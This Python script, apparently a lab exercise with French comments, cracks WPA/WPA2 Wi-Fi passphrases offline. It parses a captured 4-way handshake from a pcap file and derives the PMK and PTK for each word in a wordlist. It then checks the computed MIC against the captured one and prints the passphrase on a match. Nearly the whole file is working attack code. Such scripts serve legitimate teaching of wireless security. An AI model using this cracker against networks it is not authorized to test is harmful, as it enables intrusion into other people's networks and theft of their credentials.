#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2_math import pbkdf2_hex
from numpy import array_split
from numpy import array
import hmac
import hashlib

wpa = rdpcap("wpa_handshake.cap")
words = open("words.txt")

ssid = wpa[3].info
APmac = a2b_hex(wpa[0].addr2.replace(':', ''))
Clientmac = a2b_hex(wpa[1].addr1.replace(':', ''))
ANonce = str(wpa[5][Raw])[13:][:32]
SNonce = str(wpa[6][Raw])[13:][:32]
A = "Pairwise key expansion"
B = min(APmac, Clientmac) + max(APmac, Clientmac) + min(ANonce, SNonce) + max(ANonce, SNonce)
mic = wpa[8].load.encode("hex")[-36:-4]
data = str(wpa[8].payload)[34:][:-18].encode('hex') + '0' * 36
data = data.decode('hex')

def customPRF512(key, A, B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i = 0
    R = ''
    while i <= ((blen*8+159)/160):
        hmacsha1 = hmac.new(key, A+chr(0x00)+B+chr(i), hashlib.sha1)
        i += 1
        R = R+hmacsha1.digest()
    return R[:blen]


print "Actual mic: ", str(mic)

for word in words:
	#calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    pmk = pbkdf2_hex(word.rstrip(), ssid, 4096, 32)

    #expand pmk to obtain PTK
    ptk = customPRF512(a2b_hex(pmk),A,B)

    #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
    computed_mic = hmac.new(ptk[0:16],data,hashlib.sha1)

    if str(computed_mic.hexdigest()[:-8]) == str(mic):
        print "Mic found: ", computed_mic.hexdigest()[:-8]
        print "Passphrase: ", word
        break
